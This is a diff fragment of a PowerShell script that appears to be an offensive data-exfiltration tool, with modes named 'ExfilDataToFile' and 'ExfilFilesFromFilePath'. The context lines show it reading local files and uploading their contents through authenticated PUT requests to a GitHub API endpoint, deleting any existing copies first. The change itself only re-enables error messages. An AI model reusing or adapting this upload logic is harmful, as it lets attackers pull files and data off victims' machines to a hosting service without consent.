@@ -134,11 +134,11 @@ if ($PsCmdlet.ParameterSetName -eq "ExfilDataToFile")
         $content = Invoke-RestMethod -Headers $Headers -Uri $GHAPI -Body $Body -Method Get -ErrorAction SilentlyContinue
          # If we get here that means we were able to get the contents so get hold of the sha
         $sha = $content.sha
-        #Write-Error $sha
+        
     }
     Catch {        
         $ErrorMessage = $_.Exception.Message;
-        #Write-Error "Trying to get file contents: " + $ErrorMessage; # remove in production
+        Write-Error "Trying to get file contents: " + $ErrorMessage; 
     }
 
    
@@ -159,7 +159,7 @@ if ($PsCmdlet.ParameterSetName -eq "ExfilDataToFile")
         }
         catch{
             $ErrorMessage = $_.Exception.Message;
-            #Write-Error "Trying to delete file: " + $ErrorMessage; #remove in production
+            Write-Error "Trying to delete file: " + $ErrorMessage; 
         }
     } 
 
@@ -173,12 +173,11 @@ if ($PsCmdlet.ParameterSetName -eq "ExfilDataToFile")
        
         try{            
             $content = Invoke-RestMethod -Headers $Headers -Uri $GHAPI -Body $Body -Method Put -ErrorAction SilentlyContinue
-            #Write-Error "Successfully uploaded file!"
         }
         catch{
             $ErrorMessage = $_.Exception.Message;
-            #Write-Error "Trying to create file: " + $ErrorMessage;
-            #exit
+            Write-Error "Trying to create file: " + $ErrorMessage;
+           
         }    
 
 
@@ -239,7 +238,7 @@ if ($PsCmdlet.ParameterSetName -eq "ExfilFilesFromFilePath")
             }
             Catch {      
                 $ErrorMessage = $_.Exception.Message;
-                #Write-Error "Trying to get file contents: " + $ErrorMessage;
+                Write-Error "Trying to get file contents: " + $ErrorMessage;
             }
 
             # Delete the file if it already exists
@@ -256,7 +255,7 @@ if ($PsCmdlet.ParameterSetName -eq "ExfilFilesFromFilePath")
                 }
                 catch{
                     $ErrorMessage = $_.Exception.Message;
-                    #Write-Error "Trying to delete file: " + $ErrorMessage;
+                    Write-Error "Trying to delete file: " + $ErrorMessage;
                 }
             } 
 
@@ -275,13 +274,13 @@ if ($PsCmdlet.ParameterSetName -eq "ExfilFilesFromFilePath")
             } | ConvertTo-Json
             
             $content = Invoke-RestMethod -Headers $Headers -Uri $GHAPI -Body $Body -Method Put -ErrorAction SilentlyContinue
-            #Write-Error "Successfully uploaded file!"
+            
 
         }
         Catch {
             $ErrorMessage = $_.Exception.Message;
-            #Write-Error "Trying to upload file " + $file.FullName + " :" + $ErrorMessage
-            #exit
+            Write-Error "Trying to upload file " + $file.FullName + " :" + $ErrorMessage
+            
         }
 
     }
